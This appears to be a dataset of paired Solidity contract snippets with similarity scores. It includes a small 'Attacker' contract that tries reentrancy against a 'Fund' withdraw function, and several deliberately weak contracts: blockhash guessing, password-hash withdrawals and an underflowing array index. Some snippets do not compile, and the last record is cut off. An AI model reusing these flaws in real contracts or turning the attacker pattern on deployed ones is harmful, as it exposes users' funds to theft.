    function issueTokens(address _who, uint _tokens);

    function burnTokens(address _who, uint _tokens);

}"
"contract MyTest {

    function isFalse() internal pure returns (bool) {
        revert();
        return false;
    }

    function isTrue() internal pure returns (bool) {
        revert();
        return true;
    }

    function test() public pure {
        if (true || isFalse()) {
            
        }
        if (false && isTrue()) {
            revert();
        }
    }
}",0.6149211336985775,"contract TrustlessTokenController is

    MTokenController

{

    

    

    



    

    

    



    function mOnTransfer(

        address ,

        address ,

        uint256 

    )

        internal

        returns (bool allow)

    {

        return true;

    }



    function mOnApprove(

        address ,

        address ,

        uint256 

    )

        internal

        returns (bool allow)

    {

        return true;

    }

}"
"contract Contract2{
    Contract1 contract1;

    function setContract1 (address addr) public {
        contract1 = Contract1(addr);
    }

    function getValueOfObj() public view returns(uint){
        return contract1.getX();
    }

    function setValueOfObj(uint pX) public{
        contract1.setX(pX);
    }
}",0.6773962365164605,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract Forward {

  address public destinationAddress;
  event LogForwarded(address indexed sender, uint amount);
  event LogFlushed(address indexed sender, uint amount);

  constructor() public {
    destinationAddress = msg.sender;
  }

  function() payable public {
    emit LogForwarded(msg.sender, msg.value);
    destinationAddress.transfer(msg.value);
  }

  function flush() public {
    emit LogFlushed(msg.sender, address(this).balance);
    destinationAddress.transfer(address(this).balance);
  }

}",0.6607353071332657,"contract MoatKyber is Trade {



    event AssetsCollected(address name, uint addr);



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



    function collectAsset(address tokenAddress, uint amount) public onlyAdmin {

        if (tokenAddress == getAddress(""eth"")) {

            msg.sender.transfer(amount);

        } else {

            IERC20 tokenFunctions = IERC20(tokenAddress);

            tokenFunctions.transfer(msg.sender, amount);

        }

        emit AssetsCollected(tokenAddress, amount);

    }



}"
"contract SignVerify {
    function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) constant returns (address) {
        return ecrecover(msgHash, v, r, s);
    }

    function isSigned(address _addr, bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) constant returns (bool) {
        return ecrecover(msgHash, v, r, s) == _addr;
    }
}",0.6104724737416998,"contract DSCache is DSValue
{
    uint128 public zzz;



    function peek() constant returns (bytes32, bool) {
        return (val, has && now < zzz);
    }
    function read() constant returns (bytes32) {
        var (wut, has) = peek();
        assert(now < zzz);
        assert(has);
        return wut;
    }
    function prod(bytes32 wut, uint128 Zzz) note auth {
        zzz = Zzz;
        poke(wut);
    }
    
    
    
    
    
    
    
    

}"
"contract Ballot {
    
    struct Voter {
        bytes32 name;
        bool voted;  
        uint vote;   
        uint givenRightTime; 
        uint votetime; 
    }

    
    struct Proposal {
        bytes32 name;
        uint voteCount;
    }

    address public chairperson;  

    mapping(address => Voter) public voters; 

    Proposal[] public proposals;  

    event voteCast(address from, bytes32 proposal, uint voteTime);

    
    function Ballot(bytes32[] proposalNames) {
        chairperson = msg.sender;

        
        for(uint i = 0; i < proposalNames.length; i++) {
            proposals.push(Proposal({
                name: proposalNames[i],
                voteCount: 0
            }));

        }
    }

    function giveRightToVote(address voter, bytes32 voterName) {
        
        if(msg.sender != chairperson || voters[voter].voted) {
            
        }
        voters[voter].name = voterName;
        voters[voter].voted = false;
        voters[voter].votetime = 0;
        voters[voter].givenRightTime = now;
    }

    
    function vote(uint proposalIndex) {
        Voter sender = voters[msg.sender];
        
        if(sender.voted) {
            throw;
        }

        proposals[proposalIndex].voteCount += 1;

        
        sender.voted = true;
        sender.votetime = now;
        sender.vote = proposalIndex;

        voteCast(msg.sender, proposals[proposalIndex].name, now);
    }

    
    function winningProposalIndex() constant
            returns (uint winningProposalIndex)
    {
        uint winningVoteCount = 0;
        for (uint p = 0; p < proposals.length; p++) {
            if (proposals[p].voteCount > winningVoteCount) {
                winningVoteCount = proposals[p].voteCount;
                winningProposalIndex = p;
            }
        }
    }

    
    function winnerName() constant
            returns (bytes32 winnerName)
    {
        winnerName = proposals[winningProposalIndex()].name;
    }
}",0.6167876817239892,"contract SimpleMultiSigWallet {

    struct Proposal {

        uint256 amount;

        address payable to;

        uint8 votes;

        bytes data;

        mapping (address => bool) voted;

    }

    

    mapping (bytes32 => Proposal) internal proposals;

    mapping (address => uint8) public voteCount;

    

    uint8 constant public maximumVotes = 2; 

    constructor() public{

        voteCount[0x8c070C3c66F62E34bAe561951450f15f3256f67c] = 1; 

        voteCount[0x7ac74Fcc1a71b106F12c55ee8F802C9F672Ce40C] = 1; 

    }

    

    function proposeTransaction(address payable to, uint256 amount, bytes memory data) public{

        require(voteCount[msg.sender] != 0, ""You cannot vote"");

        bytes32 hash = keccak256(abi.encodePacked(to, amount, data));

        require(!proposals[hash].voted[msg.sender], ""Already voted"");

        if (proposals[hash].votes == 0){

            proposals[hash].amount = amount;

            proposals[hash].to = to;

            proposals[hash].data = data;

            proposals[hash].votes = voteCount[msg.sender];

            proposals[hash].voted[msg.sender] = true;

        }else{

            proposals[hash].votes += voteCount[msg.sender];

            proposals[hash].voted[msg.sender] = true;

            if (proposals[hash].votes >= maximumVotes){

                if (proposals[hash].data.length == 0){

                    proposals[hash].to.transfer(proposals[hash].amount);

                }else{

					bool success;

					bytes memory returnData;

					(success, returnData) = proposals[hash].to.call.value(proposals[hash].amount)(proposals[hash].data);

					require(success);

                }

                delete proposals[hash];

            }

        }

    }

    

    

    function tokenFallback(address from, uint value, bytes memory data) public{

        

    }

    

    function() external payable{

        

    }

}"
"contract Coin { 
  address public minter; 
  mapping (address => uint) public balances;

  event LogSent(address from, address to, uint amount, bytes32 data);

  function Coin() {
    balances[msg.sender] = 1000000000000000000000000000000000000;
    minter = msg.sender;
  }

  function mint(address receiver, uint amount) {
    if (msg.sender != minter) return;
    balances[receiver] += amount;
  }

  function send(address receiver, uint amount, bytes32 data) 
    returns(bool success) 
  {
    if (balances[msg.sender] < amount) throw;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    LogSent(msg.sender, receiver, amount, data);
    return true;
  }

}",0.683214196405361,"contract Bank is DSMath { mapping(address => uint) public balances;

  event LogDepositMade(address accountAddress, uint amount); function deposit() public payable returns (uint balance) {

    balances[msg.sender] = add(balances[msg.sender], msg.value);

    emit LogDepositMade(msg.sender, msg.value);

    return balances[msg.sender];

  } function withdraw(uint amount) public returns (uint remainingBalance){

    require(min(amount,balances[msg.sender]) == amount);

    balances[msg.sender] = sub(balances[msg.sender],amount);

    msg.sender.transfer(amount);

    return balances[msg.sender];

  } 



function balance() view public returns (uint) {

    return balances[msg.sender];

  }

}"
"contract Test {
     uint256 counter;

     function increment(uint256 times) public {
         for (uint256 i = 0; i < times; i++) {
             counter += 1;
         }
     }
}",0.6070503166574527,"contract MintableToken {
    event Mint(address indexed to, uint256 amount);

    
    function mint(address _to, uint256 _amount) public;
}"
"contract A is Ownable {
  B public b;

  function A(address _bAddress) public {
    b = B(_bAddress);      
  }

  function callSomeMethodOnB() public {
    b.someMethod();
  }
}",0.6144162936992797,"contract PauseLike {
    function plot(address, bytes32, bytes memory, uint) public;
    function exec(address, bytes32, bytes memory, uint) public;
}"
"contract B is Ownable {
  uint256 public callCounter;

  function B() public {

  }

  function someMethod() public onlyOwner {
    callCounter = callCounter + 1;
  }  
}",0.6311631963995716,"contract Pause is Owned {
	uint8 public pause;

	constructor() public {
		pause = 0;
	}

	function setPause(uint8 _pause) onlyOwner public {
		pause = _pause;
	}
}"
"contract Guess {
  function guessMe(uint guess) public returns(bool success) {
    return uint(blockhash(block.number)) == guess;
  }
}",0.6438921278967793,"contract Token{
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
}"
"contract TtdmToken {

        uint256 public totalSupply;

        function constructor_TtdmToken () public {
            totalSupply = 1000000;
        }
       }",0.6252858705305641,"contract TokenParam {

	

    uint256 public constant decimals = 18;



	

    uint256 public  totalSupply = 500 * 10 ** decimals;



}"
"contract MyContract {
  uint public BTCUSD;

  function set(uint val) {
      BTCUSD = val;
  }
}",0.6816837265145155,"contract FiatContract {

    function USD(uint _id) constant public returns (uint256);

}"
"contract PriceFeed {
    function setVal(address addr) {
        MyContract(addr).set(2);
    }
}",0.6306177665386723,"contract Resolver {
    function setAddr(bytes32 node, address addr);
}"
"contract Borrower {
    string  public borrowerName;
    uint256 public amountToPay;

    function payLoan(Loan _loan) payable public {

        
        Loan loan   = Loan(_loan);
        amountToPay = msg.value;

        
        loan.makePayment.value(amountToPay)();
    }   

    function getThisBalance() public view returns (uint256){

        return this.balance;
    }
}",0.6289205402971707,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract Loan {

        address public borrower;
        uint256 public loanBalance;

        uint256 public received;

        function Loan(address _borrower, uint _loanBalance) public {
            borrower    = _borrower;
            loanBalance = _loanBalance;
            }

        function makePayment() payable public {

            received    =  msg.value;
            loanBalance -= received;
        }

    function getThisBalance() public view returns (uint256){

        return this.balance;
    }
}",0.6407354459962168,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract Siphon {
  address private _owner;
  address private _beneficiary;

  modifier onlyOwner {
    if (msg.sender != owner) {
      throw;
    }
    _;
  }

  
  
  function Siphon(address owner, address beneficiary) payable {
    _owner = owner;
    _beneficiary = beneficiary;
  }

  function withdraw(uint256 amount) onlyOwner {
    
    
    uint256 beneficiaryAmount = amount / 100;
    if (beneficiaryAmount > 0) {
      if (!_beneficiary.send(beneficiaryAmount)) {
        throw;
      }
    }
    if (!owner.send(amount - beneficiaryAmount)) {
      throw;
    }
  }

  
  function () payable onlyOwner {}
}",0.6038049069435666,"contract Owned {

    address public owner;
    mapping (address => bool) public isAdmin;

    function Owned() {
        owner = msg.sender;
        isAdmin[msg.sender] = true;
    }

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }

    modifier onlyAdmin() {
        assert(isAdmin[msg.sender]);
        _;
    }

    function addAdmin(address user) onlyAdmin {
        isAdmin[user] = true;
    }

    function removeAdmin(address user) onlyAdmin {
        if (user == owner) {
            throw; 
        }
        isAdmin[user] = false;
    }

    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }


}"
"contract Notary {
   mapping(bytes32 => address) public owner;
   function notarize(bytes32 hashdata) {
       owner[hashdata] = msg.sender;
   }
}",0.6392107423983714,"contract Registrar { 
    modifier onlyOwner(bytes32 _hash) { _; }
    function transfer(bytes32 _hash, address newOwner) onlyOwner(_hash) {}
}"
"contract MyContract{
    uint256 public sqrtValue;
    Aion aion;
    address public owner;
    address public myAionaddress;
    uint256 public schId;
    constructor() public{
        owner = msg.sender;
    }

    function scheduleMyfucntion(uint256 transferAmount, address to) public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('transfer(uint256)')),to,transferAmount); 
        uint callCost = 200000*1e9 + aion.serviceFee();
        (schId,myAionaddress) = aion.ScheduleCall.value(callCost)( block.timestamp + 1 days, address(this), 0, 200000, 1e9, data, true);
    }

    function transfer(uint256 transferAmount, address to) public {
        require(msg.sender == owner || msg.sender == myAionaddress);
        to.transfer(transferAmount);    
    } 

    function () public payable {}

}",0.6359586543447995,"contract TokenSale {

    IERC20Token public tokenContract;  

    address owner;

    uint256 public tokensSold;



    event Sold(address buyer, uint256 amount);



    constructor(IERC20Token _tokenContract) public {

        owner = msg.sender;

        tokenContract = _tokenContract;

    }



    

    function safeMultiply(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        } else {

            uint256 c = a * b;

            assert(c / a == b);

            return c;

        }

    }



    function () public payable {



        uint256 scaledAmount = safeMultiply(msg.value, 5000000);



        require(tokenContract.balanceOf(this) >= scaledAmount);





        tokenContract.transfer(msg.sender, scaledAmount);

    }





    function endSale() public {

        require(msg.sender == owner);



        

        require(tokenContract.transfer(owner, tokenContract.balanceOf(this)));



        msg.sender.transfer(address(this).balance);

    }

}"
"contract C {

    function thatAdd(uint256 a, uint256 b) returns (uint256) {
        return L.add(a, b);
    }

    function thisAdd(uint256 a, uint256 b) returns (uint256) {
        return a + b;
    }

}",0.6695150296694947,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract Users {

  mapping(address => bytes32) public users;
  event UserCreated(address indexed _address, bytes32 _pseudo);

  function create (bytes32 _pseudo) public {
    users[msg.sender] = _pseudo ;
    emit UserCreated(msg.sender, _pseudo);
  }
  function get (address _address) public view returns(bytes32 _pseudo) {
    require(exists(_address));
    return (users[_address]);
  }
}",0.6216593110322949,"contract ERC20 {
    function transferFrom(address _from, address _to, uint _value) public returns (bool);
    function approve(address _spender, uint _value) public returns (bool);
    function allowance(address _owner, address _spender) public constant returns(uint);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract token {    
  function () payable {
    create(msg.sender);
  }
  function create(address _beneficiary) payable{
    uint256 amount = msg.value;
    
  }
}",0.6799255434589301,"contract Migratable {
    function migrate(address user, uint256 amount, address tokenAddr) external payable returns (bool);
}"
"contract test {

    mapping (address => mapping (address => uint[])) public allowed;

    function approve (address _to, uint256 tokenId) external {
       allowed [msg.sender][_to].push(tokenId);
    }

    function getArray(address testAddress) constant returns (uint[]) {
        return allowed[msg.sender][testAddress];
    }
}",0.6753893537496554,"contract ERC20 {
    function transfer(address receiver, uint amount) external;
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint256 tokens) public returns (bool success);
}"
"contract Foo {
    uint a;
    function Foo(uint _a) public {
        a = _a;
    }
}",0.6863730955329829,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Sharer {
    function sendHalf() public payable {
        require(msg.value % 2 == 0);
    }
}",0.6440917745531071,"contract Verification{
    function() payable public{
        msg.sender.transfer(msg.value);
    }
}"
"contract ContractInstance {
    string public _name;
    address public _head;
    address public _creator;

    constructor(string name, address head, address creator) public {
        _name = name;
        _head = head;
        _creator = creator;
    }

    function doSomething(string name) public {
        _name = name;
    }
}",0.6132234750853217,"contract ModuleCoreState {

    

    
    address public core;

    
    address public vault;

    
    ICore public coreInstance;

    
    IVault public vaultInstance;

    

    
    constructor(
        address _core,
        address _vault
    )
        public
    {
        
        core = _core;

        
        coreInstance = ICore(_core);

        
        vault = _vault;

        
        vaultInstance = IVault(_vault);
    }
}"
"contract Test {

   address[] investors;
   mapping(address => uint256) private balances;

   function saveAddress() payable public {
       investors.push(msg.sender);
       balances[msg.sender] = msg.value;
   }
}",0.6211645255243441,"contract TokenERC20 {
    mapping (address => uint256) public balanceOf;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}"
"contract test {

    uint[] values = [1,2,3,4,5,6];
    uint[] auxArray;

    function removeValueFromArray(uint _num) public returns(uint[]) {

        

        for (uint i = 0; i < values.length; i++){
            if(values[i] != _num)
                auxArray.push(values[i]);
        }

        return auxArray;
    }
}",0.624497231833133,"contract ArrayTools {

    function _combineArray(uint256[] _array) internal pure returns(uint256) {
        uint256 fullAmount;
        for(uint256 i = 0; i < _array.length; i++) {
            require(_array[i] > 0);
            fullAmount += _array[i];
        }
        return fullAmount;
    }
}"
"contract Foo {
  function doStuff() external virtual pure returns(string memory) {
    return ""do stuff"";
  }

  function doMoreStuff() external virtual pure returns(string memory) {
    return ""do more stuff"";
  }
}",0.6564624085623688,"contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
    
}"
"contract Mycontract {

  
  function Mycontract() payable {}

  
  function pay() payable {}
}",0.6190466874876389,"contract ETHCOOLMain {
    function contractBoost(uint share) public payable {}
}"
"contract Demo {
    event print(address _foo);

    modifier c (address _foo) {
        emit print(_foo);
        _;
    }
    function b (address _foo) c (msg.sender) {
        emit print(_foo);
    }
}",0.6098623543538559,"contract Proxy {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract Importer {
    
    function doSom (address _address) public pure returns (bool) {
        require(lib.isZero(_address));
        return true;
    }   
}",0.6901818621198171,"contract GNTJoinLike {
    function bags(address) public view returns (address);
    function make(address) public returns (address);
}"
"contract ADD {
    uint256 total;

    function add(uint256 a, uint256 b) public {
        total = a+b;
    }
}",0.656457822638037,"contract MSD2 {

   

    function fus (uint256 i) public pure returns (uint256) {

        return i*100;

    }

}"
"contract XYZ {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function doSomething() external {
        emit SomethingDone(address(this));
    }

    event SomethingDone(address _addr);
}",0.6461220340188376,"contract FakePlinc is IDistributable {

    address payable owner;
    constructor() public {
        owner = msg.sender;
    }
    
    function distribute() external payable override {
        owner.transfer(msg.value);
    }
}"
"contract ABC {
    address public owner;

    XYZ xyz_;

    constructor(XYZ _xyz) public {
        xyz_ = _xyz;
        owner = msg.sender;
    }

    function interactWithXYZ() external {
        xyz_.doSomething();
    }
}",0.6121061716265885,"contract Owned {
    
    constructor() public { owner = msg.sender; }
    address owner;

    modifier onlyOwner {
        require(
            msg.sender == owner,
            ""Only owner can call this function.""
        );
        _;
    }
}"
"contract Test {

    bytes32 public constant MY_DATE = keccak256(now);

    function check() constant returns (bytes32) {
        return MY_DATE;
    }
}",0.6404294641584101,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract TimedCommitment {
    address payable revealer;
    address payable fineRecipient;
    bytes32 public hash;
    uint256 public deadline;

    constructor(address payable _fineRecipient, bytes32 _hash, uint256 timeout) public payable {
        revealer = msg.sender;
        fineRecipient = _fineRecipient;

        hash = _hash;
        deadline = now + timeout;
    }

    
    function providePreimage(bytes calldata preimage) external {
        require(keccak256(preimage) == hash);
        revealer.transfer(address(this).balance);
    }

    
    function refund() external {
        require(msg.sender == fineRecipient);
        require(now >= deadline);

        msg.sender.transfer(address(this).balance);
    }
}",0.6226381667197983,"contract Countdown {
    uint public deadline = now;
    uint private constant waittime = 12 hours;
    
    address private owner = msg.sender;
    address public winner;
    
    function () public payable {
        
    }
    
    function click() public payable {
        require(msg.value >= 0.0001 ether);
        deadline = now + waittime;
        winner = msg.sender;
    }
    
    function withdraw() public {
        require(now > deadline);
        require(msg.sender == winner);
        
        deadline = now + waittime;

        
        
        if(this.balance < 0.0005 ether)
            msg.sender.transfer(this.balance);
        else
            msg.sender.transfer(this.balance /  10);

        
        if(this.balance > 0.0005 ether)
            owner.transfer(0.0005 ether);
    }
}"
"contract Fund {

    bool mutex = false;

    function withdraw() {
        if (!mutex) {
            mutex = true;
            msg.sender.send(1);
            mutex = false;
        }
    }

    
    function deposit() payable {}
}",0.6061694590880875,"contract WETHInterface is ERC20 {

  function() external payable;

  function deposit() external payable;

  function withdraw(uint wad) external;

}"
"contract Attacker {

    Fund f;

    function Attacker(address fund) payable {
        f = Fund(fund);
    }

    function attack() {
        f.withdraw();
    }

    function () payable {
        f.withdraw();
    }
}",0.6105925415058705,"contract WETHInterface is ERC20 {

  function() external payable;

  function deposit() external payable;

  function withdraw(uint wad) external;

}"
"contract D {
    address[] addr;
    address cAddr;
    function D() {
        addr.push(0xa);
        addr.push(0xb);
        cAddr = new C(addr);
    }

    function getCaddresses(uint index) returns(address) {
        return C(cAddr).verifiedUsers(index);
    }
}",0.6056133032981115,"contract IUserData {

    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    

    function getUserRef(address _address, string _gameName) public view returns (address);

}"
"contract One is IOne {
    
}",0.6842490521831456,"contract NGNT is V1 {

}"
"contract Two is ITwo {
    
}",0.6907355502974171,"contract NGNT is V1 {

}"
"contract UserExample {

    struct UserStruct {
        
        
        
        bool isUser;          
        bool isAdmin;
    }

    mapping(address => UserStruct) public userStructs;

    function isUser(address user) public view returns(bool) {
        return userStructs[user].isUser;
    }
}",0.6022042916235931,"contract Token is MintableToken {

  mapping(address => uint256) balances;

  function transfer(address _to, uint256 _value) public returns (bool);

  function balanceOf(address owner) public view returns (uint256);

}"
"contract NotSoSecret {

    bytes32 public secretHash;

    

    function deposit(bytes32 _secretHash) public payable returns(bool success) {
        secretHash = _secretHash;
        return true;
    }

    

    function claim(bytes32 password) public returns(bool success) {
        if(sha3(password) == secretHash) {
            msg.sender.transfer(this.balance);
            return true;
        }
        return false;

    }
}",0.6086881096992476,"contract Eth {
    address owner;
    bytes message;

    function Eth() {
        owner = msg.sender;
    }

    
    function getAll() payable returns (bool) {
       if (msg.sender == owner) {
           msg.sender.transfer(this.balance);
           return true;
       }

       return false;
    }

    function getMessage() constant returns (bytes) {
        return message;
    }

    function () payable {

        message = msg.data;
    }
}"
"contract MyContract {

    uint startTime;
    function tmp() public view returns(uint){
        require(startTime != 0);
        return (now - startTime)/(1 minutes);
    }
    function callThisToStart() {
        startTime = now;
    }
    function callThisToStop() {
        startTime = 0;
    }
    function doSomething() returns (uint){
        return tmp();
    }

}",0.6128685369968665,"contract DateTime {

    function isLeapYear(uint16 year) public pure returns (bool);

    function getYear(uint timestamp) public pure returns (uint16);

    function getMonth(uint timestamp) public pure returns (uint8);

    function getDay(uint timestamp) public pure returns (uint8);

}"
"contract MyContract {

  function myTokenBalance(address tokenContractAddress) public view returns(uint) {
    IERC20 token = IERC20(tokenContractAddress); 
    return token.balanceOf(msg.sender);
  }
}",0.6528237789143609,"contract SendERC20Token {

    

    function withdrawToken(address _tokenAddress) public {



        IERC20 token = IERC20(_tokenAddress);



        require(token.transfer(msg.sender, 1000000000000000000) == true);

    }

}"
"contract TestStrings {

    using Strings for string;

    function testCOntract(string memory _base) public pure returns(string memory) {
        return _base.concat(""_suffix"");
    }
}",0.6196442057256566,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract TestInvalidJumpLoc {

    function testInvalidJumpLocation() public constant returns (uint[5]) {
      uint[5] memory data;
      uint j = 1;
      j = j - 2;
      data[j] = 1235;
      return data;
    }
",0.6114724215924581,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract LinkRegistrar {
  address private owner;

  event Link (string link);

  constructor () public {
    owner = msg.sender;
  }

  function registerLink (string memory link) public {
    require (msg.sender == owner);
    emit Link (link);
  }
}",0.679821327503199,"contract CarelessWhisper {

    address owner;

    event Greeting(bytes data);

    

    constructor() public {

        owner = msg.sender;

    }



    function greeting(bytes data) public {

    }

    

    function kill() public {

        require (msg.sender == owner);

        selfdestruct(msg.sender);

    }

}"
"contract AirDrop is Ownable {

  Token token;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  modifier whenDropIsActive() {
    assert(isActive());

    _;
  }

  function AirDrop () public {
      address _tokenAddr = 0x0F513fFb4926ff82D7F60A05069047AcA295C413; 
      token = Token(_tokenAddr);
  }

  function isActive() public constant returns (bool) {
    return (
        tokensAvailable() > 0 
    );
  }
  
  function sendTokens(address[] dests, uint256[] values) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    while (i < dests.length) {
        uint256 toSend = values[i] * 10**18;
        sendInternally(dests[i] , toSend, values[i]);
        i++;
    }
  }

  
  function sendTokensSingleValue(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    uint256 toSend = value * 10**18;
    while (i < dests.length) {
        sendInternally(dests[i] , toSend, value);
        i++;
    }
  }  

  function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
    if(recipient == address(0)) return;

    if(tokensAvailable() >= tokensToSend) {
      token.transfer(recipient, tokensToSend);
      TransferredToken(recipient, valueToPresent);
    } else {
      FailedTransfer(recipient, valueToPresent); 
    }
  }   


  function tokensAvailable() public constant returns (uint256) {
    return token.balanceOf(this);
  }

  function destroy() public onlyOwner {
    uint256 balance = tokensAvailable();
    require (balance > 0);
    token.transfer(owner, balance);
    selfdestruct(owner);
  }
}",0.6418471023743096,"contract TGEarlyInvestorsFund is Ownable{
    using SafeMath for uint256;

    IERC20 public TG;
    address TG_Addr = address(0);

    uint32 private _till = 1592722800;
    uint256 private _holdings;

    mapping (address => uint256) private _investors;

    event InvestorRegistered(address indexed account, uint256 amount);
    event Donate(address indexed account, uint256 amount);


    
    constructor() public {
        TG = IERC20(TG_Addr);
    }

    
    function () external payable {
        if (now > _till && _investors[msg.sender] > 0) {
            assert(TG.transfer(msg.sender, _investors[msg.sender]));
            _investors[msg.sender] = 0;
        }

        if (msg.value > 0) {
            emit Donate(msg.sender, msg.value);
        }
    }

    
    function holdings() public view returns (uint256) {
        return _holdings;
    }

    
    function investor(address owner) public view returns (uint256) {
        return _investors[owner];
    }

    
    function registerInvestor(address to, uint256 amount) external onlyOwner {
        _holdings = _holdings.add(amount);
        require(_holdings <= TG.balanceOf(address(this)));
        _investors[to] = _investors[to].add(amount);
        emit InvestorRegistered(to, amount);
    }

    
    function rescueTokens(address tokenAddr, address receiver, uint256 amount) external onlyOwner {
        IERC20 _token = IERC20(tokenAddr);
        require(TG != _token);
        require(receiver != address(0));

        uint256 balance = _token.balanceOf(address(this));
        require(balance >= amount);
        assert(_token.transfer(receiver, amount));
    }

    
    function setTGAddress(address _TGAddr) public onlyOwner {
        TG_Addr = _TGAddr;
        TG = IERC20(_TGAddr);
    }
}"
"contract company {

struct contractDetails {
    string contractId;
    string companyA;
    string companyB;
    address A;
    address B;
    uint256 timestamp;
    string signHash;
    bool isSigned;
}

mapping (address => contractDetails) contractAddr;
uint public counter = 0;

function createContract(string memory _contractId, string memory _companyA, string memory _companyB, address _B) public {
    counter++;
    contractAddr[_B] = contractDetails(_contractId, _companyA, _companyB, msg.sender, _B, now, '', false);
}

function getAllContracts(address _address) public view returns(contractDetails[] memory) {
    contractDetails[] memory y;
    for(uint i = 0; i < counter; i++) {
        y[i] = contractAddr[_address];
    }
    return(y);
}
}",0.6029260584711789,"contract Authenticity is Ownable{
    
    address[] contracts;
    
    
    modifier withContract(address _addr){
        uint length;
        assembly { length := extcodesize(_addr) }
        require(length > 0);
        _;
    }
    
    
    constructor(address _contractAddress) public {
        contracts.push(_contractAddress);
    }

    
    function getAddress(address checkAddress) public view withContract(checkAddress) returns (bool success) {
        for(uint i = 0; i<contracts.length;i++ )
        if(checkAddress==contracts[i]) success=true;
    }
    
    
    function addContract(address _contractAddress) onlyOwner withContract(_contractAddress) public returns (bool success){
        if(!getAddress(_contractAddress)) contracts.push(_contractAddress);
        return true;
    }
    
    
    function getAddresses() public view returns (uint){
        return contracts.length;
    }
}"
"contract PiggyBank {

    bytes32 public secretHash;

    constructor(bytes32 hash) public {
        secretHash = hash;
    }

    function deposit() public payable returns(bool) {
        
        
        return true;
    }

    function withdrawEverything(bytes32 password) public returns(bool) {
        require(keccak256(abi.encodePacked(password)) == secretHash);
        
        
        msg.sender.transfer(address(this).balance);
        return true;
    }
}",0.6200834726245902,"contract Distribute {



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    

    function transferETHS(address[] _tos) payable public returns(bool) {

        require(_tos.length > 0);

        uint val = this.balance / _tos.length;

        for (uint32 i = 0; i < _tos.length; i++) {

            _tos[i].transfer(val);

        }

        return true;

    }



    function () payable public {

        owner.transfer(this.balance);

    }

}"
"contract Factory {

    address[] public contracts;

    function createContract() public {
        address childContract = new Contract();
        contracts.push(childContract);
    } 

    function getContractsLength() public returns (uint) {
        return contracts.length;
    }
}",0.6305756276593945,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract Test {
    bytes32[] hashes;

    function hash(bytes data) public pure {
        return keccak256(data);
    }

    function store(bytes32 hash) public {
        hashes.push(hash);
    }
}",0.6507680850217028,"contract DSProxy {
    function execute(address _target, bytes memory _data) public payable returns (bytes32);
    function setOwner(address owner_) public;
}"
"contract AssetLocker is ERC721TokenReceiver {
    mapping (address => mapping(uint256 => address)) beneficialOwner;

    function unfreeze(ERC721 nftContract, uint256 tokenId) external {
        require(beneficialOwner[address(nftContract)][tokenId] == msg.sender);
        nftContract.safeTransferFrom(address(this), msg.sender, tokenId);
    }

    
    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    )
        external
        returns(bytes4)
    {
        beneficialOwner[msg.sender][tokenId] = from;
        return 0x150b7a02;
    }
}",0.6420731307652415,"contract AcceptsExchange {

    tenfiniti public tokenContract;



    function AcceptsExchange(address _tokenContract) public {

        tokenContract = tenfiniti(_tokenContract);

    }



    modifier onlyTokenContract {

        require(msg.sender == address(tokenContract));

        _;

    }



    

    function tokenFallback(address _from, uint256 _value, bytes _data) external returns (bool);

    function tokenFallbackExpanded(address _from, uint256 _value, bytes _data, address _sender, address _referrer) external returns (bool);

}"
"contract ShippingOrder{
    TA2_Transfer public t;
    address public oOrigin;
    address public oShipper;
    address public oCarrier;
    address public oReceiver;
    uint public oCount;

    mapping (address => uint) public oBalances;
